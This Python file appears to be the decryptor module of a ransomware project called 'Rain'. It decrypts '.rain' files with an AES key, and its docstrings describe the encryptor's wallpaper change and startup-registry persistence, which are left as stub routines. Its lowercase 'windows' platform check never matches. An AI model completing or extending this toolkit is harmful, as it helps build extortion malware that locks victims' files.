import platform
from .Encrypt import RainEncrypt
from .core.directory_iter import DirectoryIter


class RainDecrypt(RainEncrypt):
    """
    Class intends to reverse the affects of RainEncrypt

    Example Usage:

        RainDecrypt("AES.key").do_final()

    """
    def __init__(self, aes_key_file_path):
        # instantiate super gives access to self.crypto and self.paths
        super().__init__(password=open(aes_key_file_path).read())

    def __remove_back_ground_windows(self):
        """
        Deletes back ground image and restores original
        I'll leaves this for you to implement
        """
        pass

    def __remove_startup_windows(self):
        """
        Delete startup registry keys and removes startup files
        I'll leaves this for you to implement
        """
        pass

    def __disinfect_all(self):
        """
        Iterate through target directories and decrypts each individual file
        Works for all platforms
        """
        for path in self.paths:
            for file in DirectoryIter(path).iter_files(path):
                self.__decrypt(file)

    def __decrypt(self, file_name: str):
        """
        Checks if file ends with the rain extension, if so it will
        attempt to decrypt it otherwise will ignore

        :param file_name: file to decrypt
        """
        if file_name.endswith(".rain"):
            self.crypto.decrypt_file(file_name, inplace=True)

    def do_final(self, **kwargs):
        """
        Consider this the entry for the decrypter
        """
        self.__disinfect_all()

        if platform.system() == "windows":  # windows only functions
            self.__remove_back_ground_windows()
            self.__remove_startup_windows()
